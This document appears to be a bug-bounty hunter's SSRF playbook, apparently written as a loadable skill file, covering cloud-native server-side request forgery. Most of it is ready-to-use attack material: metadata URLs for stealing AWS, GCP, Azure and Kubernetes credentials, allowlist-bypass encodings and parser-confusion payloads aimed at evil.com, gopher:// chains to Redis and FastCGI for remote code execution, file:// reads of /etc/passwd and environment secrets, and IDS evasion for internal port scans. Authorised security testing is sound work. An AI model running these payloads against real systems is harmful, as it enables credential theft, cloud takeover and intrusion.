# Moraa — SSRF (modern, cloud-native) test cases

> Load when hunting SSRF. Commands first. THE ONE RULE still applies: a blind ping to your
> collaborator with no reachable internal impact is often *intended* (cert-fetch, image proxy,
> webhook) — push for **metadata creds / internal service / redirect-to-admin**, or drop it.
> (Lesson from acme.example: an unauth "SSRF" to an intended cert-fetch endpoint = Low/Info, not High.)

---

## 0. Where SSRF actually lives (hunt these features first)

Any server-side fetch of a **user-influenced** value:
- Webhooks / "send test event" / callback URLs (check for `ssrfSafeDispatcher` omission + auto-redirect-follow — self-hosted-scheduler class).
- **PDF / datasheet / report / screenshot generators** (headless Chrome/wkhtmltopdf → `file://`, IMDS, internal). device-datasheet class.
- Avatar / image / logo / "import from URL" / media proxies, unfurl/link-preview.
- **OIDC/SAML IdP config**: `issuer`, `jwks_uri`, `authorization_endpoint`, `metadata_url`, SCIM base URL — server fetches them (mesh IdP class).
- Integrations: git clone URL, RSS/feed reader, S3/GCS/remote-object fetch, XML/`SYSTEM` (XXE→SSRF), SVG, proxy/`?url=`/`?target=`/`?dest=`/`?redirect=`/`?next=`/`?image=`/`?callback=`.
- Signed/HMAC fetch (`?url=&time=&digest=`): if the digest is **client-computable** (secret in the JS/worker), it's forgeable → SSRF/injection (OTLP-collector class). Check the bundle for the signing key.
- **SaaS-facade with overridable upstream host — the highest-paying class** (the vendor
  `billing.svc.acme.example/api/v2/products?host=` → backend fetched `https://<host>/v1/products`
  with `Authorization: Bearer sk_live_…` + Stripe client headers attached = credentialed SSRF,
  non-blind, crit). The 3 ingredients: (1) an endpoint that is a *client* of a third-party API
  (Stripe/Twilio/SendGrid/HubSpot — paths mirror `/v1/products`, `/v1/customers`, `/v1/invoices`,
  or response is raw passthrough `{"object":"list","has_more":…}`); (2) a user-controllable
  input that sets WHERE the client sends (`host`, `upstream`, `baseUrl`, `api_url`, `endpoint`,
  `server`, `target`, `region`, `env` — often a debug/multi-env leftover); (3) the HTTP client
  attaches its auth headers to *whatever* host it's told to reach → key exfiltration.
  **Why it pays:** no allowlist question, no metadata dependency — the credential rides the
  request itself; one collaborator capture IS the report. Hunt it on `billing|pay|checkout|svc|gw`
  subdomains (billing-surface.py ranks them), param-mine every authenticated GET/POST on the
  facade, and when the callback fires READ THE FULL REQUEST — the finding is the headers
  (`Authorization`, `X-Stripe-*`, `X-API-Key`), not the ping. Redact the key; never replay it.

Recon params fast:
```bash
# pull candidate params from JS + urls
cat *.js | grep -oiE '(url|uri|dest|target|redirect|next|callback|image|img|src|webhook|feed|proxy|fetch|link|host|domain|endpoint|jwks|issuer|metadata)[=":]' | sort -u
# param brute
ffuf -w params.txt -u 'https://T/api/x?FUZZ=http://COLLAB' -mc all
```

---

## 1. Cloud metadata — the payloads that turn SSRF into creds

Always try these the moment a fetch reaches internal. IMDS creds = cloud takeover.

```
# AWS IMDSv1 (no header)         → returns role name, then creds JSON
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
http://169.254.169.254/latest/user-data
# AWS IMDSv2 (needs PUT token; SSRF must allow custom headers OR chained TTL)
PUT http://169.254.169.254/latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)
GET .../latest/meta-data/...  (X-aws-ec2-metadata-token: <token>)
# ECS / Fargate task role (very common; NO header, just the relative URI)
http://169.254.170.2/v2/credentials/<uuid>
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
# EKS / IRSA → web identity token file on disk (chain via file://)
file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
```
# GCP  (header Metadata-Flavor: Google  — else 403)
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Azure IMDS (header Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# DigitalOcean / Oracle / Alibaba
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/opc/v2/instance/            (Oracle, hdr Authorization: Bearer Oracle)
http://100.100.100.100/latest/meta-data/           (Alibaba)
# Kubernetes (if pod-networked)
https://kubernetes.default.svc/api/v1/namespaces/default/secrets   (Bearer /var/run/secrets/.../token)
http://consul:8500/v1/kv/?recurse   http://etcd:2379/v2/keys/?recursive=true
```
> If provider needs a header and the SSRF is a bare GET, you can't set it → **GCP/Azure often
> blocked, AWS ECS (169.254.170.2, headerless) and IMDSv1 are the wins.** Note which provider
> the target uses (headers/DNS/error strings) and aim the right payload.

---

## 2. Filter / allowlist bypass table (when `localhost`/`169.254` is blocked)

```
# IP encodings for 127.0.0.1
2130706433            (decimal)          0x7f000001         (hex)
0177.0.0.1            (octal)            0x7f.0x0.0x0.0x1
127.1  127.0.1        (shortened)        0                  0.0.0.0
[::1] [::ffff:127.0.0.1] [0:0:0:0:0:ffff:7f00:1]           (IPv6 / mapped)
①②⑦.0.0.1  ⓪ (enclosed alphanumerics, some parsers)
# IP encodings for 169.254.169.254
0xA9FEA9FE   2852039166   0251.0376.0251.0376   [::ffff:a9fe:a9fe]
# DNS tricks
127.0.0.1.nip.io  169.254.169.254.nip.io  localtest.me  spoofed.burpcollaborator.net
make-a-record → your-domain A 169.254.169.254        (own-DNS pointing internal)
DNS rebinding: TTL-0 record flips public→127.0.0.1 between validation & fetch (rbndr.us, singularity)
# URL-parser confusion (host allowlist bypass) — RFC vs lib disagreement
http://ALLOWED@evil.com/            http://evil.com#ALLOWED
http://evil.com\@ALLOWED/           http://ALLOWED.evil.com
http://127.0.0.1:80\@ALLOWED/       http://foo@127.0.0.1:80@ALLOWED/
http://ALLOWED%00.evil.com   http://ALLOWED%2523@evil   (double-encode #)
http://ALLOWED%252F..%252F@evil   (CVE-parser splits differ: python vs go vs node vs curl)
# Redirect-based (server validates the FIRST url, follows 30x to internal)
your-server /r → 302 Location: http://169.254.170.2/...    (test 301/302/303/307/308)
```

## 3. Schemes (protocol smuggling)

```
file:///etc/passwd  file:///proc/self/environ  file:///proc/self/cwd/  file://C:/windows/win.ini
file:///var/run/secrets/kubernetes.io/serviceaccount/token   (SA token via file)
gopher://127.0.0.1:6379/_<redis cmds>   (blind Redis RCE: SET cron / SLAVEOF / module load)
gopher://127.0.0.1:25/  (SMTP)   gopher://127.0.0.1:11211/ (memcached)   gopher://…:9000 (FastCGI→RCE)
dict://127.0.0.1:6379/info   dict://internal:11211/stats
http://internal:8080  (unauth actuator/console/debug — see framework-misconfig.md)
```
> `gopher://` is how blind SSRF becomes RCE (Redis, FastCGI, unauth internal HTTP with a crafted
> POST). Build the payload with Gopherus.

## 4. Blind SSRF — prove it even when no body comes back

```bash
# collaborator/interactsh — DNS pings through even when egress HTTP is filtered
interactsh-client            # or Burp Collaborator; get UNIQUE token per test
payload = http://<token>.oast.fun/    → watch for DNS (proves fetch) then HTTP (proves egress)
```
> **Before trusting ANY "no interactions" negative** →  Case 4 (mint the payload
> in THIS Burp instance — a pasted payload from another project polls silent forever) and Case 6
> (attribute hits by egress-IP + User-Agent + per-point label, NOT by hostname case — scrambled
> capitals like  are just resolver DNS 0x20, not payload tampering).
>
> **HTTPS fetchers: Collaborator subdomain tags are a TLS trap** (a SaaS slack-test case,
> 2026-10-23): Burp Collaborator's cert covers exactly `<token>.oastify.com` — any added label
> (`slack.<token>.oastify.com`) fails certificate verification at the target's fetcher → the
> interaction NEVER lands and the negative is false. Tag by **PATH** (`https://<token>.oastify.com/w1-live`)
> not by subdomain whenever the target fetches HTTPS with verification. Verify the channel once with
> a self-echo if the target offers one (their `test` endpoint echoed `Server: Burp Collaborator`
> headers back — positive proof without reading the collab inbox at all).

- **DNS-only hit, no HTTP** = internal-only fetcher (still SSRF, but scope it: can it reach metadata/internal? try IP-literal internal targets and time responses).
- **Timing oracle**: internal-open port responds fast, filtered/closed hangs → port-scan the VPC blind.
- **Error-based**: different error for `http://127.0.0.1:22` (protocol mismatch) vs closed port → oracle.

### 4b. Redirect-loop technique (PortSwigger Research Top 10 2025 #3, @shubs) — makes fully-blind
SSRF provable without any OOB infrastructure
Point the vulnerable fetch at a URL you control that itself redirects the target server back to
*the same URL* (or a short redirect cycle), so the target's own HTTP client gets stuck fetching a
loop. The loop's **observable side effects on the response you DO get back** — an elevated
response time (the client burned its retry/redirect budget before giving up), a distinctive
"too many redirects" error page, or the request outright timing out where a normal request
wouldn't — prove the server-side fetch is real and reached your infrastructure, without needing a
collaborator/interactsh callback at all. Useful specifically when egress is so locked down that
even DNS callbacks never land (fully airgapped internal fetcher) — the loop's effect is visible
from the *response you already get*, no external channel required.
```
your-redirector /loop → 302 Location: /loop            (or a short A→B→A cycle)
payload = http://your-redirector/loop
# baseline: time a request to a URL that returns 200 immediately, same redirector/infra
# test:     time a request to /loop
# a consistent, reproducible delta (or a "too many redirects" body) = the fetch is real
```
Escalate from proof to impact the normal way once confirmed (§1 metadata payloads, §3 scheme
smuggling) — the loop only proves the SSRF exists, it doesn't itself read anything.

### 4c. HTTP/2 CONNECT tunneling for internal port scanning (PortSwigger Research Top 10 2025 #9,
@flomb) — IDS/IPS evasion angle on an SSRF-adjacent primitive
Where the target's SSRF-capable component (or a reachable internal proxy) speaks HTTP/2, the
`CONNECT` method over an HTTP/2 stream can tunnel arbitrary TCP to an internal host:port — and
because the traffic rides inside a single multiplexed HTTP/2 connection rather than looking like
many discrete new TCP connections, IDS/IPS tooling tuned for HTTP/1.1-level connection patterns
often doesn't flag the resulting internal port scan the way it would a classic sequential connect
sweep. Relevant when doing the §4 "port-scan the VPC blind" timing-oracle technique against a
target you know or suspect is behind network-level scan detection — the HTTP/2 CONNECT path is the
lower-noise version of the same recon.

### 4d. Log/telemetry-based internal-IP discovery (Google VRP — "Into the Borg", opnsec) — turn a
blind, probe-and-hope SSRF into a TARGETED one by reading the fetching service's own telemetry
When you control a server-side fetch/request and have ANY visibility into the fetching service's own
operational telemetry (access logs, error logs, APM/tracing dashboards, timing/monitoring data you
can read via a DIFFERENT feature or a misconfigured logging endpoint), check whether that telemetry
discloses the service's own outbound source IP or internal hostname. Real case: the server-side
fetcher (Google Caja's `<script src>` fetch/parse/sanitize) never returned internal data — but its
access logs, visible to the researcher via a separate App Engine logging interface, recorded the
request's ORIGINATING internal IP (`10.x.x.201`). With that confirmed internal IP, the researcher
targeted it directly and reached unauthenticated internal monitoring endpoints (Borglet
`/getstatus`) that were only reachable from inside that IP range.
```
# the shape of what you're looking for in any log/trace/monitoring surface the fetcher writes to:
# "GET https://your-collab/ HTTP/1.1" 200 ... from 10.x.x.201   ← the service's OWN internal source IP
# then aim the SSRF at that exact IP/range instead of probing blind
```
> **Generalizable lesson:** a blind SSRF with no body-return path can still become a TARGETED
> internal SSRF if you can discover the real internal IP range this way — turn a probe-and-hope
> blind SSRF into a scoped one aimed at a confirmed internal address. Pairs with the §4
> timing/error oracles: the oracles prove the fetch is real, this tells you WHERE to aim it.

## 5. From SSRF to impact (the chains that pay)

```
SSRF → IMDS/ECS creds → aws sts get-caller-identity → S3/Secrets/RDS → cloud takeover
SSRF → internal admin/actuator/console (no auth on internal net) → RCE / config dump
SSRF → gopher://redis → SET dir/dbfilename + cron or authorized_keys → RCE
SSRF → OIDC jwks_uri points to attacker → sign own tokens → ATO (IdP config SSRF)
SSRF → 169.254 in a PDF/screenshot renderer → creds rendered into the PDF you download
SSRF read file:// → /proc/self/environ (env secrets) / app config / k8s SA token
```

## 6. Methodology (don't over-report — acme.example lessons)

**OOB attribution & cloud-scanner false positives (proven 2026-10-23, chaos spray):**
- Tag payloads as SUBDOMAINS (`http://<hostslug>.<param>.<collab>/`) — Burp Collaborator then
  attributes even DNS-only callbacks; path-tags (`/slug~param`) only work for HTTP fetches.
  Keep a slug→host→program map (collab-map.tsv pattern, tagged-replay.sh in dorking workspace).
- **Aliyun-hosted targets poison OOB attribution**: Alibaba's cloud security auto-fetches EVERY
  URL seen in request params AND headers with UA `SSRFDetector/1.0 Security Scanner` (egress
  ~47.106.137.69 + resolver pool 120.76.x/112.74.x/47.1xx). On `*.aliyuncs.com`/Aliyun targets,
  a collaborator callback proves NOTHING — you need response-differential or in-band proof.
- Noise signatures to filter: Google Public DNS (172.253.x/74.125.x) = plain recursion;
  Azure GWC resolvers (51.116.x/20.170.x) A+AAAA pairs = app-style resolution, worth a look
  but DNS-only ≠ finding. A real lead = tagged payload fetched by an app HTTP client
  (Go-http-client/Java/curl/okhttp) or creds riding the callback.

1. Confirm the fetch is server-side & user-controlled (collaborator DNS).
2. Ask: **is this the endpoint's job?** (cert fetch, image proxy, webhook to arbitrary URL = often intended). If yes and it can't reach internal/metadata → Low/Info, note and move on.
3. Escalate: internal IPs, metadata, `file://`, redirect, scheme smuggling. **Impact = what you read/reach**, not that a packet left.
4. Check protections you can defeat: allowlist-with-redirect-follow, DNS rebinding, TOCTOU on a "safe dispatcher" that a later redirect bypasses.
5. Quantify → `validate.md` → `findings/`. A real SSRF names the internal target it reached.

## Impact gate — the packet leaving is not the finding

SSRF claims are graded by what the response let you READ or REACH internally, never by the callback:

- **Write down the internal resource whose CONTENT appeared in your response** — metadata creds
  JSON, an internal API body, `file://` bytes, a cert identity. That one sentence IS the finding;
  if you can't write it, you don't have one.
- **A Collaborator DNS/HTTP hit with no internal content = the [[validate]] kill signal** ("DNS
  callback only"). It proves reachability, not impact — a LEAD, not a finding.
- **Intended-endpoint falsifier (the acme.example cert-fetch lesson, §6/§7):** if fetching URLs is the
  endpoint's JOB, the finding requires internal/metadata reach an attacker can't get otherwise —
  named internal target PLUS what came back from it. An intended fetch that only ever reaches
  public hosts is Low/Info.
- **Blind oracles (§7):** a cert-CN / error-text / timing side channel is graded by what internal
  FACT it discloses (resolver IP, port state, topology). An oracle that distinguishes nothing an
  outsider couldn't guess is noise.

## 7. Blind SSRF — data-return oracles when no response body comes back (acme.example cert-fetch, proven via Burp)
A "blind" SSRF that returns no body can still leak internal data through side channels — squeeze these before calling it Low:
- **TLS certificate identity leak:** a cert-fetching endpoint (`domain/cert`-style) that returns the
  target's cert **CN / SANs / fingerprint** is an internal-HTTPS *identity* oracle. Point it at internal
  IPs/hostnames on :443 and read back the cert CN → discloses internal service names & topology.
  Proof: querying `1.1.1.1` returned `c_name:"cloudflare-dns.com"` (the cert CN, not an echo) → so
  internal `:443` targets leak their cert identity the same way.
- **Verbatim error oracle:** if the server reflects the raw HTTP-client error, it leaks the **internal
  DNS resolver** (`dial tcp: lookup X on 10.0.0.2:53: no such host` → resolver = 10.0.0.2), open vs
  closed vs filtered ports (distinct error text), and whether you're in EKS/ECS/EC2 (`kubernetes.default.svc`
  resolves or not). Three-state open/closed/filtered map of the VPC with no body needed.
- **Scheme downgrade via redirect:** redirect through a valid-cert redirector you control strips
  `https://` → you get an arbitrary plain-HTTP GET (scheme+host+port+path) inside the VPC. Error text
  `Get "http://169.254.169.254/...": dial tcp ...:80` proves the downgrade reached IMDS.
- **Metadata caveat:** IMDS/ECS metadata is **HTTP (no TLS)** → a cert-oracle SSRF can *reach* it
  (validate vs closed-port control) but can't read the cert (there is none) and won't return the body.
  So cert-oracle SSRF = strong internal recon + High, but NOT creds-theft unless a body-return path
  exists. State that ceiling honestly (our finding stayed High, not Critical, for exactly this reason).
